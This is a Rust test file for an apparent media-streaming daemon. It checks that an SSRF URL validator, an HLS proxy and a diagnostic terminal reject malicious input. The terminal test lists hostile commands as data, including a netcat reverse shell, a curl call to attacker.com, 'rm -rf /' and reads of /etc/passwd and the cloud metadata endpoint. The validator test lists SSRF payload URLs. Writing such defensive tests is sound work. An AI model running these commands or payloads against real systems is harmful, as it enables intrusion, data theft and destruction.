use axum::http::StatusCode;
use miru_core::api::terminal::execute_command;
use miru_core::db::Database;
use miru_core::net::validator::is_safe_remote_url;

#[test]
fn test_ssrf_validator_blocks_internal_and_private_networks() {
    // IPv4 Loopback & Localhost
    assert!(is_safe_remote_url("http://127.0.0.1:8767/api/settings").is_err());
    assert!(is_safe_remote_url("http://127.0.0.99:8080/").is_err());
    assert!(is_safe_remote_url("http://localhost:8767/api/ping").is_err());
    assert!(is_safe_remote_url("http://foo.localhost/").is_err());

    // Cloud Metadata Service (AWS, GCP, Azure, DigitalOcean)
    assert!(is_safe_remote_url("http://169.254.169.254/latest/meta-data/").is_err());
    assert!(is_safe_remote_url("http://metadata.google.internal/computeMetadata/v1/").is_err());

    // RFC 1918 Private Subnets
    assert!(is_safe_remote_url("http://10.0.0.1/admin").is_err());
    assert!(is_safe_remote_url("http://172.16.0.1/").is_err());
    assert!(is_safe_remote_url("http://192.168.1.1/setup.cgi").is_err());

    // IPv6 Loopback & Unspecified
    assert!(is_safe_remote_url("http://[::1]:8767/").is_err());
    assert!(is_safe_remote_url("http://[::]:80/").is_err());

    // Special domains (.local, .internal, .lan)
    assert!(is_safe_remote_url("http://device.local/").is_err());
    assert!(is_safe_remote_url("http://nas.internal/").is_err());
    assert!(is_safe_remote_url("http://router.lan/").is_err());

    // Dangerous / Non-HTTP Schemes
    assert!(is_safe_remote_url("file:///etc/passwd").is_err());
    assert!(is_safe_remote_url("file://localhost/etc/shadow").is_err());
    assert!(is_safe_remote_url("ftp://ftp.example.com/file").is_err());
    assert!(is_safe_remote_url("gopher://127.0.0.1:70/").is_err());
    assert!(is_safe_remote_url("javascript:alert(1)").is_err());
    assert!(is_safe_remote_url("data:text/html,<html>").is_err());

    // Valid public URLs must pass
    assert!(is_safe_remote_url("https://hianime.at/watch/one-piece").is_ok());
    assert!(is_safe_remote_url("https://zokoanime.video/embed/stream.m3u8").is_ok());
    assert!(is_safe_remote_url("http://cdn.megacloud.tv/hls/ep1/master.m3u8").is_ok());
}

#[tokio::test]
async fn test_proxy_fetch_hls_rejects_ssrf() {
    let result = miru_core::proxy::fetch_hls_text("http://127.0.0.1:8767/api/settings", None).await;
    assert!(result.is_err());
    let err_str = result.unwrap_err().to_string();
    assert!(err_str.contains("Disallowed HLS target") || err_str.contains("forbidden"));
}

#[test]
fn test_terminal_exec_blocks_arbitrary_shell_commands() {
    let temp_db_path = format!("{}/test_audit_db_{}.db", std::env::temp_dir().display(), std::process::id());
    let db = Database::init(&temp_db_path).expect("Failed to init temp db");

    // Prohibited command execution attempts
    let attacks = [
        "cat /etc/passwd",
        "rm -rf /",
        "whoami",
        "bash -c 'id'",
        "sh -c 'curl attacker.com'",
        "ls -la",
        "nc -e /bin/sh 10.0.0.1 4444",
        "curl http://169.254.169.254",
        "env",
        "python -c 'import os; os.system(\"id\")'",
    ];

    for atk in &attacks {
        let output = execute_command(atk, &db);
        assert!(
            output.starts_with("Command not recognized:"),
            "Command injection vector '{}' was not rejected! Got: {}",
            atk,
            output
        );
    }

    // Allowed whitelisted commands
    assert!(execute_command("ping", &db).contains("PONG"));
    assert!(execute_command("help", &db).contains("Miru Diagnostic Terminal Commands:"));
    assert!(execute_command("stats", &db).contains("Miru Daemon Stats:"));
    assert!(execute_command("db stats", &db).contains("SQLite Database Record Counts:"));
    assert!(execute_command("cache clear all", &db).contains("Success: Cleared"));

    // Cleanup
    let _ = std::fs::remove_file(&temp_db_path);
}

#[tokio::test]
async fn test_opensubtitles_fails_fast_without_api_key() {
    let temp_db_path = format!("{}/test_audit_os_{}.db", std::env::temp_dir().display(), std::process::id());
    let db = Database::init(&temp_db_path).expect("Failed to init temp db");
    let state = miru_core::AppState { db };

    // Query opensubtitles with NO API key configured in database
    let result = miru_core::api::sub::opensubtitles::query_opensubtitles(&state, "Naruto", 1, "id,en").await;
    assert!(result.is_err(), "OpenSubtitles should fail fast when API key is unconfigured");
    let err_msg = result.unwrap_err().to_string();
    assert!(
        err_msg.contains("OpenSubtitles API key is not configured"),
        "Unexpected error: {}",
        err_msg
    );

    // Cleanup
    let _ = std::fs::remove_file(&temp_db_path);
}
